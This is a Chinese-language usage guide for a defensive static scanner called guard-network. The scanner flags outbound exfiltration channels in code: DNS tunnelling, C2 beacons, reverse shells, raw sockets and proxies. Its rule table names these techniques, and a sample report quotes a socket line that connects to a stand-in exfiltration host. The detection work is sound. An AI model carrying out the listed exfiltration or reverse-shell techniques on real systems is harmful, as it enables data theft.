# guard-network 使用说明（v2.0.0）

外联 / 数据外泄通道检测。在代码发布前静态扫描外联通道与可疑外泄手法，算外联暴露指数，出可阻断性报告，看清出口再上线。

## 快速开始

```
# 扫描某目录，报告写到该目录下 network_report.md（高/极端退出码 4）
python scripts/guard.py scan <目录>

# 只看结构化命中（JSON）
python scripts/guard.py scan <目录> --json

# 列出全部 12 条规则
python scripts/guard.py rules

# 聚合目录下所有报告，生成价值账本 guard-ledger.md
python scripts/guard.py ledger <目录>

# 打印引擎版本
python scripts/guard.py version
```

## 子命令

| 子命令 | 作用 | 退出码 |
|--------|------|--------|
| `scan <目录>` | 扫描并出 network_report.md | 0 / 1 / 2 / 4 |
| `scan <目录> --json` | 同上，额外打印结构化命中 | 0 / 1 / 2 / 4 |
| `scan <目录> --out <文件>` | 指定报告输出路径 | 0 / 1 / 2 / 4 |
| `rules` | 列出 12 条外联/外泄通道规则 | 0 |
| `ledger <目录>` | 聚合报告生成价值账本 | 0 / 1 |
| `version` | 打印引擎版本 | 0 |

## 退出码

| 码 | 含义 |
|----|------|
| 0 | 通过（低危或无命中） |
| 1 | 参数错（缺目录 / 路径不存在） |
| 2 | IO·运行错（资源解析失败 / 报告写入失败） |
| 3 | 未知命令 |
| 4 | 已拦截（高/极端风险，建议不要直接上线） |

## 六层规则（12 条）

| 层 | 规则 | 严重度 | 可阻断性 |
|----|------|--------|----------|
| egress 外联通道 | NET-EGRESS-POST 出站 POST/PUT 带数据体 | 高 | 可阻断 |
| egress 外联通道 | NET-EXFIL-B64POST 编码后外发 | 高 | 可阻断 |
| egress 外联通道 | NET-EGRESS-SOCKET 原始 socket 直连外部 | 极端 | 不可阻断 |
| dns DNS 隧道 | NET-DNS-EXFIL 编码数据喂 DNS 解析 | 高 | 不可阻断 |
| dns DNS 隧道 | NET-DNS-DYNAMIC 动态域名服务 | 中 | 可阻断 |
| c2 C2 信标 | NET-C2-KNOWN 超长/随机子域（DGA 特征） | 极端 | 可阻断 |
| c2 C2 信标 | NET-C2-BEACON 定时外联（信标） | 高 | 可阻断 |
| tunnel 隧道/代理 | NET-TUNNEL-REVSHELL 反弹 shell | 极端 | 不可阻断 |
| tunnel 隧道/代理 | NET-TUNNEL-PROXY 内网穿透/反向代理 | 高 | 可阻断 |
| raw 原始套接字 | NET-RAW-SOCKET 原始套接字/抓包 | 高 | 不可阻断 |
| raw 原始套接字 | NET-RAW-PACKET 构造/注入数据包 | 中 | 不可阻断 |
| safe 安全变体 | NET-SAFE-EGRESS 出口白名单+TLS 校验+审计 | 低 | 可阻断（仅鼓励） |

## 量化模型

- **外联暴露指数**：命中严重度权重累加（极端 100 / 高 40 / 中 12 / 低 3），封顶 100。
- **判定优先级链**：极端 > 高 > 中 > 低（取最高，非平均）。
- **可阻断性维度**：每条标 可阻断（应用层能拦）/ 不可阻断（需内核/网络层）。
- **安全控制价值量化**：极端 8h / 高 4h / 中 1h / 低 0h 的避免外泄阻断与排查工时。

## 报告样例（节选）

```
## 一、判定
- 风险等级：极端
- 外联暴露指数：100 / 100
- 可阻断性：0 处可阻断 / 3 处不可阻断
- 处置建议：禁止上线（无例外，先加出口白名单/审计/TLS 校验再发布）

## 三、命中清单
| 严重度 | 类型 | 可阻断 | 规则 | 文件:行 | 片段 | 备注 |
|---|---|---|---|---|---|---|
| 极端 | 外联通道 | 不可阻断 | 原始 socket 直连外部(NET-EGRESS-SOCKET) | agent.py:3 | s.connect(("exfil.example.com", 4444)) | 建议：禁止裸 socket 直连... |
```

## 诚实边界

- 仅静态检测，不实际拦流量；决策权在人。
- 对运行时真实外联无感知；不承诺 100%。
- 可阻断性是经验判断，非保证。
- 详见 `references/defense-stance.md`。

## 文件结构

```
guard-network/
├── SKILL.md
├── scripts/guard.py
├── resources/{rules,network-models,network-domains}.json
├── references/{network-egress-theory,c2-detection,defense-stance}.md
├── FAQ.md  README.md  SELF_EVAL.md  CHANGELOG.md
└── examples/{sample-scan-extreme,high,mid,clean}.md
```
